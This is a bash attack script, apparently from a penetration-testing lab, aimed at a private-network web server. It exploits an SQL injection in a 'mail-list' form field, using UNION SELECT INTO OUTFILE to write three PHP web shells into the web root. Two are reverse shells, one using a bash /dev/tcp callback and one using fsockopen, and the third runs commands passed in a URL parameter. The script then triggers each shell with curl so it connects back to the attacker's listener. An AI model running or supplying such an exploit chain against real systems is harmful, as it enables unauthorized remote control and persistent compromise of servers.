#!/bin/bash

# Deploy Reverse Shell via SQL Injection
# Target: 192.168.145.48
# Writable directory confirmed: /var/www/html/
# Column count: 6

TARGET="http://192.168.145.48/index.php"
LHOST="192.168.45.5"  # Your Kali IP - UPDATE THIS!
LPORT="443"           # Your listener port

echo "[*] SQL Injection Reverse Shell Deployment"
echo "[*] Target: $TARGET"
echo "[*] Callback to: $LHOST:$LPORT"
echo

# Method 1: Simple PHP reverse shell
echo "[+] Method 1: PHP exec reverse shell"
SHELL_NAME="rev_$(date +%s).php"
PAYLOAD="<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"'); ?>"

curl -X POST "$TARGET" \
  --data-urlencode "mail-list=test@test.com' UNION SELECT '$PAYLOAD',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/$SHELL_NAME'-- -" \
  -s -o /dev/null

echo "[*] Webshell written to: http://192.168.145.48/$SHELL_NAME"
echo "[*] Start listener: nc -lvnp $LPORT"
echo "[*] Then trigger shell by visiting: http://192.168.145.48/$SHELL_NAME"
echo
echo "[*] Press Enter when listener is ready..."
read

# Trigger the shell
curl -s "http://192.168.145.48/$SHELL_NAME" &

# Method 2: Alternative PHP reverse shell with fsockopen
echo "[+] Method 2: PHP fsockopen reverse shell"
SHELL2="rev2_$(date +%s).php"
PAYLOAD2='<?php $sock=fsockopen("'$LHOST'",'$LPORT');$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>'

curl -X POST "$TARGET" \
  --data-urlencode "mail-list=test@test.com' UNION SELECT '$PAYLOAD2',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/$SHELL2'-- -" \
  -s -o /dev/null

echo "[*] Alternative shell at: http://192.168.145.48/$SHELL2"
sleep 2
curl -s "http://192.168.145.48/$SHELL2" &

# Method 3: Command execution webshell for manual reverse shell
echo "[+] Method 3: Command execution webshell"
CMD_SHELL="cmd_$(date +%s).php"
curl -X POST "$TARGET" \
  --data-urlencode "mail-list=test@test.com' UNION SELECT '<?php system(\$_GET[\"c\"]); ?>',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/$CMD_SHELL'-- -" \
  -s -o /dev/null

echo "[*] Command shell at: http://192.168.145.48/$CMD_SHELL?c=id"
echo "[*] For reverse shell use:"
echo "    curl 'http://192.168.145.48/$CMD_SHELL?c=bash+-c+\"bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261\"'"